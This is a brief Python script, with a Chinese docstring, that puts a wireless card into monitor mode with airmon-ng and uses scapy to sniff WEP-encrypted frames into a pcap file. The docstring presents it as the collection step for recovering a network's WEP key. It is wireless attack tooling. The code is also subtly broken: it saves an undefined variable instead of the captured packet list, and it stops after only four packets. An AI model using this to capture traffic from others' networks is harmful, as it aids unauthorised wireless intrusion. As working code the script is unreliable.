"""
   (收集足够的有效数据包就可以从数据包中提取出密码碎片，利用这些密码碎片来计算出WEP，所以现在WEP很少见了.
   使用sniff()捕获在网络中传播的数据包,如果该数据包中有Dot11WEP属性，就将其存储在wep_handshake.pcap

"""
import subprocess
subprocess.call('airmon-ng start wlan0',shell=True)
import sys
from scapy.all import *
iface = "wlan0mon"
nr_of_wep_packets = 4
packets = []
def handle_packet(packet):
   if packet.haslayer(Dot11WEP):
      packets.append(packet)
      if len(packets) == nr_of_wep_packets:
         wrpcap("wep_handshake.pcap", wep_handshake)
         sys.exit(0)
print("Sniffing on interface " + iface)
sniff(iface=iface, prn=handle_packet)